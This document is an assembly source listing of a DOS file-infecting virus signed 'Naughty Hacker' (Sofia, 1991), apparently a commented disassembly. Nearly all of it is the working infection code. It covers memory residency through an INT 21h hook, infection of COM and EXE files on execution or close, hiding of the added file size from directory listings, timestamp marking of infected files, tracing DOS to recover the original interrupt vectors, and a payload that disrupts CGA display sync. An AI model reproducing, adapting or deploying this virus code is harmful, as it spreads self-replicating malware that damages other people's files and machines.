 .model tiny
 .code
 .radix  16

ASSUME DS:CODE,SS:CODE,CS:CODE,ES:CODE

                        org 0100h
                        CALL    EntryPoint      ; Call virus entry point

; Here begin virus by himself

EntryPoint:
			 POP	BP		; Restore in BP address of data area
			 PUSH	BX		; Save BX
			 PUSH	CX		; Save CX
			 PUSH	ES		; Save ES
			 PUSH	DS		; Save DS
			 CLC			; Clear carry flag
			 MOV	AX,4B4Bh	; Load AX with self-check word
			 INT	21		; Call int21
			 JC	Install 	; If virus is loaded CF==0

			 PUSH	DS		; Save DS
			 PUSH	CS		; Set DS point to PSP
			 POP	DS		;
			 MOV	SI,DI		; SI=DI= virus CODE begin
			 SUB	SI,0003 	; include CALL in the beginning
			 ADD	SI,BP		; Adjust different offsets
			 MOV	CX,047Ch	; Compare virus code only
			 CLD			; Clear direction
			 REP	CMPSB		; Repeat until equal
			 POP	DS		; Restore DS
			 PUSH	DS		; Set ES = DS
			 POP	ES
			 JZ	ReturnControl	; If virus -> return to file

Install:
			 MOV	CS:[offset FunCounter+BP],3456	     ;	Load generation counter
			 MOV	AX,DS		; Move PSP segment in AX
			 DEC	AX		; Compute MCB of PSP

			 MOV	DS,AX		; Set DS to MCB
			 SUB	[0003],0050	; "Steal" some memory
			 MOV	AX,ES:[0002]	; ????
			 SUB	AX,0050 	; ????
			 MOV	ES:[0002],AX	;
			 PUSH	AX		; Save new virus segment
			 SUB	DI,DI		; DI=0

			 MOV	SI,BP		; SI point to virus begin
			 SUB	SI,0003 	; Adjust CALL in the beginning
			 MOV	DS,DI		; DS set to 0
			 MOV	BX,Offset int21handler	; Load BX with int 21 handler
			 XCHG	BX,[0084]	; and set it in vector table
			 MOV	CS:[BP+offset Int21off],bx    ; Save old vector offset
			 XCHG	AX,[0086]	; Set new int21 seg & get old segment
			 MOV	CS:[BP+offset Int21seg],ax    ; Save old vector segment
			 POP	ES		; Set ES point to new virus seg
			 PUSH	CS		; Set DS point to current virus seg (PSP)
			 POP	DS		;
			 MOV	CX,offset LastByte	; Will move all virus
			 REP	MOVSB		; Move virus in hi memory (as Eddie)

			 MOV	AX,4BB4h	; Int21 is grabbed by virus
			 INT	21		; This SetUp virus function
ReturnControl:
			 POP	DS		; Restore DS
			 POP	ES		; Restore ES
			 CMP	byte ptr CS:[BP+ComFlag],43	  ; Check if host file is COM
			 JZ	ReturnCOM	; If COM -> exit COM
ReturnEXE:
			 MOV	AX,CS:[BP+First3]	 ; Load AX with old IP
			 MOV	DX,CS:[BP+First3+2]	 ; Load AX with old CS
			 MOV	CX,CS		; Load CX with current run segment
			 SUB	CX,CS:[BP+06]	; Calculate PSP+10h
			 MOV	DI,CX		; Save result in DI
			 ADD	DX,CX		; In DX is now start segment
			 POP	CX		; ???
			 POP	BX		; ???
			 CLI			; Disable interrupts
			 ADD	DI,CS:[BP+04]
			 MOV	SS,DI
			 STI
DoReturn:				; 009B
			 PUSH	DX	; Push entry segment
			 PUSH	AX	; Push entry offset

			 SUB	AX,AX	; Clear registers
			 SUB	DX,DX	; Clear of AX may cause trouble
			 SUB	BP,BP	; with several programs (as DISKCOPY)
			 SUB	SI,SI	; AX must be saved on entry and restored
			 SUB	DI,DI	;
			 RETF		; Return control to EXE file

ReturnCOM:
			 POP	CX	; ???
			 POP	BX	; ???
			 MOV	AX,[BP+First3]	 ; Load AX with first 2 instr
			 MOV	[0100],AX		; and restore them at file begin
			 MOV	AX,[BP+First3+2] ; Load AX with second 2 instr
			 MOV	[0102],AX		; and restore them at file begin
			 MOV	AX,0100 		; Set AX to entry offset
			 MOV	DX,CS			; Set DX to entry segment
			 JMP	   short    DoReturn		    ; Go to return code

FindFirstNext:
			 PUSHF			; Save flags
			 CALL	dword ptr CS:[offset Dos21off]	; Call DOS
			 PUSH	BX		; Save rezult of searching
			 PUSH	ES
			 PUSH	SI
			 PUSH	AX
			 MOV	SI,DX		; DS:SI point to FCB with search argument
			 CMP	byte ptr [SI],0FFh	 ; Check for Extended FCB
			 JNZ	NoDirCommand	; If FCB not extended then command is not DIR
			 MOV	AH,2Fh		; Get DTA address; Result of search is in DTA
			 INT	21
			 MOV	AX,ES:[BX+1Eh]	; Load file time to AX
			 AND	AX,001Fh	; Mask seconds
			 CMP	AX,001Fh	; Check if file  seconds are  62
			 JNZ	NoDirCommand	; If seconds!=62 -> file not infected
			 CMP	ES:[BX+26h],0000 ; Check file size, hi byte
			 JNZ	AdjustSize	; If file bigger than 64K -> immediate adjust
			 CMP	ES:[BX+24h],offset LastCode ; Check low byte of file size
			 JC	NoDirCommand	; If file is less than virus -> skip adjust
AdjustSize:
			 SUB	ES:[BX+24h],offset LastCode ; Decrement file size with virus size
			 SBB	ES:[BX+26h],0000 ; Decrement hi byte of size if need

NoDirCommand:
			 POP	AX		; Restore registers
			 POP	SI
			 POP	ES
			 POP	BX
			 IRET			; Return to caller

HereIam:
			 PUSH	CS		; If AX==4B4B -> so virus call me
			 POP	ES		; Set ES to virus segment
			 MOV	DI,000C 	; Set DI to virus code begin
			 IRET			; Return to caller
Int21handler:
			 CMP	AH,11h		; If function is FindFirst
			 JZ	FindFirstNext	; If so -> will adjust file size
			 CMP	AH,12h		; If function is FindNext
			 JZ	FindFirstNext	; If so -> will adjust file size
			 CMP	AX,4B4Bh	; If AX==4B4B -> Identification
			 JZ	HereIam  ; function
			 CMP	AX,4BB4h	; Setup function
			 JNZ	Continue	; Continue checking of AH
			 JMP	SetUp
Continue:
			 PUSH	AX		; Save important registers
			 PUSH	BX
			 PUSH	CX
			 PUSH	DX
			 PUSH	SI
			 PUSH	DI
			 PUSH	BP
			 PUSH	DS
			 PUSH	ES

			 CMP	AH,3Eh		; If function CLOSE file handle
			 JZ	CloseFile	;
			 CMP	AX,4B00h	; If function is EXEC file
			 MOV	AH,3Dh		; If so set AH to OPEN function
			 JZ	Infect		; and infect file
ErrorProcess:
			 MOV	AX,CS:[offset FunCounter]	; Load nomer pored na function
			 CMP	AX,0000  ; If counter is != 0
			 JNZ	AdjustFunCount	; then only decrease counter
			 JMP	VideoFuck	; else go to video fuck
AdjustFunCount:
			 DEC	AX
			 MOV	CS:[04A0h],AX
EndInt21:
			 POP	ES		; Restore important registers
			 POP	DS
			 POP	BP
			 POP	DI
			 POP	SI
			 POP	DX
			 POP	CX
			 POP	BX
			 POP	AX
			 JMP	   dword ptr CS:[offset Int21off]  ; Jump to DOS

			 DB	9A		; ??????

CloseFile:
			 MOV	AH,45
Infect:
			 CALL	CallDOS 	; Call DOS int 21
			 JC	ErrorProcess	; If error -> Stop processing
			 MOV	BP,AX		; Save file handle in BP
			 MOV	AX,3508 	; Get timer interrupt
			 CALL	CallDOS
			 MOV	CS:[offset TimerOff],BX    ; and save it in variable
			 MOV	CS:[offset TimerSeg],ES
			 PUSH	BX				; and to stack
			 PUSH	ES
			 MOV	AL,21		; Get in21
			 CALL	CallDOS
			 PUSH	BX		; and save it on stack
			 PUSH	ES
			 MOV	AL,24		; Get critical error int
			 CALL	CallDOS
			 PUSH	BX		; and store  it on stack
			 PUSH	ES
			 MOV	AL,13		; Get int 13 (disk I/O)
			 CALL	CallDOS
			 PUSH	BX		; and save it on stack
			 PUSH	ES
			 MOV	AH,25		; Now he will SET vectors
			 LDS	DX,dword ptr CS:[offset Int13off] ; Load int13 bios address
			 CALL	CallDOS 	; Set it in vector table
			 MOV	AL,21
			 LDS	DX,dword ptr CS:[offset Dos21off] ; Load int21 dos address
			 CALL	CallDOS 	; Set in vector table
			 MOV	AL,24		; Will set critical error handler
			 PUSH	CS
			 POP	DS		; Set DS point to vurus segment
			 MOV	DX,offset CriticalError ; Load its own critical handler
			 INT	21		; Set in vector table
			 MOV	AL,08		; Set new timer
			 MOV	DX,offset TimerHandler	; Load its own timer
			 INT	21		; Set in vector table
			 MOV	BX,BP		; Restore file handle from BP to BX
			 PUSH	BX		; Save handle on stack
			 MOV	AX,1220 	; Get handle table number
			 CALL	CallInt2F	; Via int2F (undocumented)
			 MOV	BL,ES:[DI]	; Load table number in BL
			 MOV	AX,1216 	; Get table address
			 CALL	CallInt2F	; Via int2F (undocumented)
			 POP	BX		; Restore file handle
			 ADD	DI,0011 	; ES:DI point to file size
			 MOV	byte ptr ES:[DI-0Fh],02   ; Set file open mode (3Dxx) to Read/Write
			 MOV	AX,ES:[DI]	; Load DX:AX with file size
			 MOV	DX,ES:[DI+02]	;
			 CMP	DX,0000 	; Check if file is less than 64k
			 JNZ	BigEnough	; If less
			 CMP	AX,offset LastCode	; Then check if file is less than virus
			 JNC	BigEnough	; If file is larger than virus -> fuck it
			 JMP	SkipFile	; else skip file
BigEnough:
			 MOV	[offset FileSizeLow],AX 	; Save file size in variables
			 MOV	[offset FileSizeHi],DX
			 SUB	AX,offset VirusAuthor-offset EndAuthor	; Decrease file size with sign size
			 SBB	DX,0000 	;
			 MOV	ES:[DI+04],AX	; Set current file position to point
			 MOV	ES:[DI+06],DX	; Virus sign
			 PUSH	DI		; Save table handle table address
			 PUSH	ES		;
			 MOV	AH,3F		; Will read from file
			 MOV	CX,offset EndAuthor-offset VirusAuthor
			 MOV	DX,offset LastByte	; Load DS:DX point AFTER virus
			 MOV	DI,DX		; DI point this area either
			 INT	21		; Read file
			 MOV	SI,Offset VirusAuthor	; DS:SI point virus sign
			 MOV	CX,offset EndAuthor-offset VirusAuthor ; Load CX sign size
			 PUSH	CS		; ES:DI point to readed byte
			 POP	ES		;
			 REP	CMPSB		; Compare virus sign with readed bytes
			 POP	ES		; Restore handle table address
			 POP	DI		;
			 JNZ	CleanFile	; If not equal -> file is clean
			 JMP	SkipFile	; Else file infected -> skip it
CleanFile:		 MOV	ES:[DI+04],0000 	; Set file pointer to 0L
			 MOV	ES:[DI+06],0000
			 MOV	AH,3F		; Will read EXE header
			 MOV	CX,001B 	; Size of EXE header
			 MOV	DX,offset LastByte	; Read in buffer AFTER virus
			 MOV	SI,DX		; Set DS:SI point to readed header
			 INT	21		; Read header
			 JNC	NoErrorHeader	; If no error in read -> go ahead
			 JMP	SkipFile	; If error occur -> skip file
NoErrorHeader:		 CMP	ES:[DI+18],4D4F 	; Check in table if file is ?OM
			 JNZ	NoComFile
			 JMP	InfectCOM
NoComFile:		CMP	ES:[DI+18],4558  ; Check for ?XE file
			 JZ	CheckForEXE	; If so -> infect it
			 JMP	SkipFile	; Else skip file

CheckForEXE:		 CMP	ES:[DI+17],45	; Check if file is realy an EXE-named
			 JZ	CheckEXEsign	; If so -> check for MZ,ZM
			 JMP	SkipFile	; Else skip file

CheckEXEsign:		CMP	[SI],5A4Dh	; Check for MZ
			 JZ	InfectEXE	; If so -> infect file
			 CMP	[SI],4D5Ah	; Check for ZM
			 JZ	InfectEXE	; If so -> infect file
			 JMP	SkipFile	; Otherwise -> skip file

InfectEXE:		MOV	byte ptr [ComFlag],45h	  ; Set file type flag to EXE
			 MOV	AX,[SI+0Eh]	; Load AX with EXE file SS
			 MOV	[SSegment],AX	 ; and save it
			 MOV	AX,[SI+14h]	; Load AX with EXE header IP
			 MOV	[IPointer],AX	 ; and save it
			 MOV	AX,[SI+16h]	; Load AX with EXE header CS
			 MOV	[CSegment],AX	 ; And save it
			 MOV	DX,offset LastCode	; Load DX with virus CODE size
			 PUSH	DX		; Save it to stack
			 MOV	CX,9h		; Compute virus size in
			 SHR	DX,CL		; 512 pages
			 ADD	[SI+04h],DX	; Increase EXE file header size field
						; with virus pages
			 POP	DX		; Restore virus size in DX
			 AND	DX,01FFh	; Compute reminder from VirusSize/512
			 ADD	DX,[SI+02]	; Save value in EXE header
			 CMP	DX,0200  ; Check virus reminder
			 JL	NoAdjustRem	; If less than 512 -> no adjust
			 SUB	DX,0200 	; Else decrease reminder
			 INC	word ptr [SI+04]	; Increase EXE header page count
NoAdjustRem:
			 MOV	[SI+02],DX	; Save correct reminder in EXE header
			 MOV	AX,[SI+08]	; Load AX with file size in paragraphs
			 SUB	DX,DX		; Set DX to Zero

			 CALL	LongMultiple16	; Get DX:AX file size in bytes
			 SUB	[offset FileSizeLow],AX 	; Correct saved file size
			 SBB	[offset FileSizeHi],DX
			 MOV	AX,[FileSizeLow]	; Load DX:AX with corrected file size
			 MOV	DX,[offset FileSizeHi]
			 CALL	LongMultiple16		; DX:AX *= 0x10
			 MOV	CX,0008 	; Calculate new entry CS:IP
			 SHL	DX,CL		; DX/=0x100
			 MOV	CX,0004
			 SHR	AX,CL		; AX/=0x10
			 MOV	[SI+14],AX	; Set entry CS:IP to EXE header
			 MOV	[SI+16],DX
			 MOV	[NewCS],DX	; Save new entry CS
			 ADD	DX,0200 	; Calculate new entry SS
			 MOV	[SI+0E],DX	; Store it to EXE header

DoInfect:
			 MOV	ES:[DI+04],0000 ; Set file pointer to 0L
			 MOV	ES:[DI+06],0000
			 PUSH	ES:[DI-02]	; Save file date/time on stack
			 PUSH	ES:[DI-04]
			 SUB	CX,CX		; Set CX to 0
			 XCHG	CX,ES:[DI-0Dh]	; Load CX file attrib/set file attrib to 0
			 PUSH	CX		; Save file attrib to stack
			 MOV	AH,40		; Write file
			 MOV	DX,offset LastByte	; EXE header
			 MOV	CX,001B 	; Rewrite modified EXE header
			 INT	21		; Do write
			 JC	BadWrite	; If error skip file
			 MOV	AX,ES:[DI]	; Set file pointer
			 MOV	ES:[DI+04],AX
			 MOV	AX,ES:[DI+02]	; to end of file
			 MOV	ES:[DI+06],AX	;
			 MOV	AH,40		; Will write
			 SUB	DX,DX		; Virus offset
			 MOV	CX,offset LastCode	; Virus size
			 INT	21	; Write virus to EXE file

BadWrite:
			 POP	CX	; Restore file attrib from stack
			 MOV	ES:[DI-0Dh],CX	 ; Set attrib of file
			 POP	CX	; Restore file date/time from stack
			 POP	DX
			 OR	byte ptr ES:[DI-0Bh],40   ; Set DO NOT UPDATE TIME flag in table
			 JC	NoFuckTime	; If write error -> Set normal time
			 OR	CX,001F ; Else set file seconds to 62
NoFuckTime:
			 MOV	AX,5701 	; Set file date/time
			 INT	21		; Via int21
SkipFile:
			 MOV	AH,3E		; CloseFile
			 INT	21
			 OR	byte ptr ES:[DI-0Ch],40   ; ????
			 SUB	AX,AX		; Set DS to 0
			 MOV	DS,AX
			 POP	AX		; Restore int 13 seg
			 MOV	[004E],AX	; Restore vector 13 seg
			 POP	AX		; Restore int 13 off
			 MOV	[004C],AX	; Restore vector 13 off
			 POP	AX		; Restore int 24 seg
			 MOV	[0092],AX	; Restore vector 24 seg
			 POP	AX		; Restore int 24 off
			 MOV	[0090],AX	; Restore vector 24 off
			 POP	AX		; Restore int 21 seg
			 MOV	[0086],AX	; Restore vector 21 seg
			 POP	AX		; Restore int 21 off
			 MOV	[0084],AX	; Restore vector 21 off
			 POP	AX		; Restore int 8 seg
			 MOV	[0022],AX	; Restore vector 8 seg
			 POP	AX		; Restore int 8 off
			 MOV	[0020],AX	; Restore vector 0 off
			 JMP	ErrorProcess		; Update counter
InfectCom:
			 TEST	byte ptr ES:[DI-0Dh],04   ; Check for SYSTEM file
			 JNZ	OkComFile	; If file IS system -> Damage file ?????
			 PUSH	SI		; Save buffer offset
			 CMP	ES:[DI+17],43	; Check if file ext begin with 'C'
			 JNZ	OkComFile	; If no -> damage file
			 MOV	byte ptr [ComFlag],43	  ; Set file type flag to COM
			 LODSW			; Load first 2 bytes of file
			 MOV	CS:[First3],AX	 ; And save them
			 LODSW			; Load seconf 2 bytes of file
			 MOV	CS:[First3+2],AX ; And save them
			 MOV	AX,ES:[DI]	; Load AX with file size
			 CMP	AX,0FA76h	; Check file size
			 POP	SI		; Restore buffer offset
			 JC	OkComFile	; If file is less than 64118 bytes -> OK infect
			 JMP	   short    SkipFile	    ; else skip file
OkComFile:
			 SUB	AX,0003 	; Calculate jump argument
			 MOV	byte ptr [SI],0E9h	 ; Set first instruction to near JMP
			 MOV	[SI+01],AX	; Store JMP argument
			 JMP	DoInfect	; Go write buffer

LongMultiple16:
			 PUSH	CX		; Save CX
			 MOV	CX,0004 	; Will repeat 4 times
DoMult:
			 SHL	AX,1		; Mult DX:AX * 2
			 RCL	DX,1		;
			 LOOP	DoMult		; Repeat 4 times -> 2^4 = 16
			 POP	CX		; Restore CX
			 RET			; Return to caller
SetUp:
			 MOV	AH,52		; Get DOS's table of table address
			 INT	21		; in ES:BX
			 MOV	CS:[Offset TableSegment],es	; Save table segment
						; Virus treat this segment as DOS segment
						; He assume int21 seg == to DOS segment
						; That's why virus will fail on DOS 5.X
			 CLI			; Disable interrupts
			 SUB	AX,AX		; Set AX to 0
			 MOV	DS,AX		; Set DS point to interrupt vectors
			 MOV	[0004],offset Debugger	; Set vector 1 (trap) offset
			 MOV	[0006],CS	;	; Set vector 1 (trap) seg
			 MOV	AX,[00BC]	; Load int2F off
			 MOV	CS:[offset Int2Foff],AX ; and save it
			 MOV	AX,[00BE]	; Load int2F seg
			 MOV	CS:[offset Int2Fseg],AX ; and save it
			 STI	; Enable interrupts
			 PUSHF		; Save flags
			 PUSHF		; Save flags
			 POP	AX	; Get flags in AX
			 OR	AX,0100 	; Set TF to 1 (trace mode)
			 PUSH	AX		; Put flags back to stack
			 POPF		; Begin trace
			 SUB	AX,AX	; AX = 0
			 DEC	AH	; AX = FF00 ???
			 CALL	dword ptr [0084]	; Call DOS (trace mode active)
			 MOV	SI,0004 	; SI = 4
			 MOV	DS,SI		; DS = SI = 4
			 MOV	AH,30		; Get DOS version
			 INT	21		; Via int21
			 CMP	AX,1E03  ; Check DOS 3.30
			 LES	AX,[SI+08]	; Load ES:AX with int13 address
			 JB	OkInt13  ; If DOS vers < 3.30 -> ignore BIOS address load/check
			 LES	AX,[0770+SI]	; then load ES:DX with BIOS address of int13
						; simulate int2F, AH=13
			 MOV	BX,ES		; BX:AX int13 BIOS address
			 CMP	BX,0C800h	; If int13 seg >= C800
			 JAE	OkInt13 	; Then address is in BIOS, all OK

			 CLI			; else HALT system
			 HLT
OkInt13:
			 MOV	CS:[offset Int13off],AX 	; Save in13 address
			 MOV	CS:[offset Int13seg],ES
			 IRET			; Return to caller, setup complete

Debugger:
			 PUSH	BP		; Save BP
			 MOV	BP,SP		; BP point to stack top
			 PUSH	BX		; Save BX
			 MOV	BX,CS:[offset TableSegment]	; Load BX with DOS segment
			 CMP	SS:[BP+04],BX	; Check debugged address
			 JNZ	ContinueDebug	; If not in DOS -> continue
			 MOV	BX,SS:[BP+02]	; else load BX with int21 off
			 MOV	CS:[offset Dos21off],BX ; and save it
			 AND	SS:[BP+06],0FEFFh	; Clear trap flag
ContinueDebug:
			 POP	BX		; Restore BX
			 POP	BP		; Restore BP
			 IRET		; Continue trace if require or
					; continue int21 execution without trace

; Next subroutine fuck you CGA display (don't affect EGA).
; Fucking result could be fix by dos MODE command

VideoFuck:
			 MOV	DX,03D4h	; Select CGA register selector
			 MOV	AL,02		; Select CRT register 2 (horiz sync)
			 OUT	DX,AL		; Do selection
			 MOV	AL,0FFh ; New sync value
			 MOV	DX,03D5h	; Select CGA register value writer
						; This could be INC DX; That save 1 byte
			 OUT	DX,AL		; Fuck horiz sync
			 JMP	EndInt21	; Terminate int21 request
CallDOS:
			 PUSHF		; Save flags
			 CALL	dword ptr CS:[offset Dos21off]	; Call ORIGINAL int21
			 RET		; Return to caller
CallInt2F:
			 PUSHF		; Save flags
			 CALL	dword ptr CS:[offset Int2Foff]	; Call SAVED int2F
			 RET		; Return to caller
TimerHandler:
			 PUSHF		; Save flags
			 CALL	dword ptr	CS:[offset TimerOff]	; Call original timer
			 PUSH	AX	; Save AX
			 PUSH	DS	; Save DS
			 SUB	AX,AX	; Set DS to interrupt table
			 MOV	DS,AX
			 CLI		; Disable interrupts
			 MOV	AX,CS:[offset Int13off] 	; Restore int13 address
			 MOV	[004C],AX
			 MOV	AX,CS:[offset Int13seg]
			 MOV	[004E],AX

			 MOV	[0020],offset TimerHandler	; Set int8
			 MOV	[0022],CS

			 MOV	AX,CS:[offset Dos21off] 	; Restore int21 address
			 MOV	[0084],AX
			 MOV	AX,CS:[offset TableSegment]
			 MOV	[0086],AX

			 MOV	AX,offset CriticalError 	; Set int24
			 MOV	[0090],AX
			 MOV	[0092],CS

			 STI			; Enable interrupts
			 POP	DS		; Restore DS
			 POP	AX		; Restore AX
			 IRET			; Terminate timing
CriticalError:
			 MOV	AL,03		; If critical error
			 IRET			; then simulate Ignore
VirusAuthor:
			db	'Sofia,Feb '
			db	27h
			db	'91 Naughty Hacker.'	; Replace this string with HORSE
EndAuthor:


LastCode		label	byte		; This is virus in file

Int21off:		DW	0		; Variable area
Int21seg:		DW	0		; NOT writed in file
Int2Foff:		DW	0
Int2Fseg:		DW	0
TimerOff:		DW	0
TimerSeg:		DW	0
Int13off:		DW	0
Int13seg:		DW	0
Dos21off:		DW	0
TableSegment:		DW	0
FileSizeLow:		DW	0
FileSizeHi:		dw	0
FunCounter:		dw	0		; Executed function counter
LastByte:		label	byte		; Memory size of virus
